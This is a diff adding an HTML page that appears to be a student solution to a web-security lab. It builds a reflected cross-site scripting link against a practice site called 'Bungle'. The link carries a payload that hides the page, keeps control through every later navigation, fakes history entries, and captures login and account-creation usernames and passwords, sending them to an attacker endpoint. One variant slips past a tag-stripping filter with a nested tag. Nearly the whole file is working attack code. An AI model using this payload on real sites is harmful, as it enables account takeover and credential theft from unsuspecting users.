@@ -1,0 +1,81 @@
+<meta charset="utf-8">
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+<script>
+    // Extend this function:
+    function payload(attacker) {
+
+        function log(attacker, data) {
+            console.log($.param(data));
+            $.get(attacker, data);
+        }
+        function proxy(attacker, href) {
+                $("html").load(href, function(){
+                $("html").show();
+                log(attacker, {event: "nav", uri: href});
+                //window.history.pushState(null, null, window.location.href);
+                $("#bungle-lnk").click(function home(){
+                   var link =document.getElementById("bungle-lnk");
+                   link.href="http://permalink.co:8080";
+                   //proxy(attacker, "http://permalink.co:8080");
+
+                   window.history.pushState(null, null, "So long and thanks for all the fish");
+                });
+                $("#search-btn").click(function search(){
+                   var link =document.getElementsByTagName("form");
+                   link[1].action="";
+                   document.getElementById("search-btn").type="";
+                   proxy(attacker, "./search?&q=" +document.getElementById("query").value);
+               });
+
+                $("#log-in-btn").mousedown(function login(){
+                   this.disabled=true;
+                   log(attacker, {event: "login", username: document.getElementById("username").value,
+                   userpass: document.getElementById("userpass").value});
+
+                   $.post( "http://permalink.co:8080/login?", {
+                       username: document.getElementById("username").value,
+                       password: document.getElementById("userpass").value},function (){
+                       proxy(attacker, "./");
+                     });
+               });
+                $("#new-account-btn").mousedown(function account(){
+                   this.disabled=true;
+                   log(attacker, {event: "create account", username: document.getElementById("username").value,
+                   userpass: document.getElementById("userpass").value});
+
+                   $.post( "http://permalink.co:8080/create?", {
+                       username: document.getElementById("username").value,
+                       password: document.getElementById("userpass").value},function (){
+                       proxy(attacker, "./");
+                     });
+               });
+
+            });
+            window.history.pushState(null, null, "So long and thanks for all the fish");
+        }
+
+        $("html").hide();
+        proxy(attacker, "./");
+        window.history.replaceState(null, null, "So long and Thanks for all the fish");
+        }
+    function makeLink(xssdefense, target, attacker) {
+        if (xssdefense == 0) {
+            return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+            encodeURIComponent("<script" + ">" + payload.toString() +
+                ";payload(\"" + attacker + "\");</script" + ">");
+                } else {
+            return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+            encodeURIComponent("<sscriptcript" + ">" + payload.toString() +
+                ";payload(\"" + attacker + "\");</sscriptcript" + ">");
+                // Implement code to defeat XSS defenses here.
+            }
+        }
+        var xssdefense = 0;
+        var target = "http://permalink.co:8080/";
+        var attacker = "http://127.0.0.1:31337/stolen";
+        $(function() {
+            var url = makeLink(xssdefense, target, attacker);
+            $("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>");
+        });
+    </script>
+    <h3></h3>
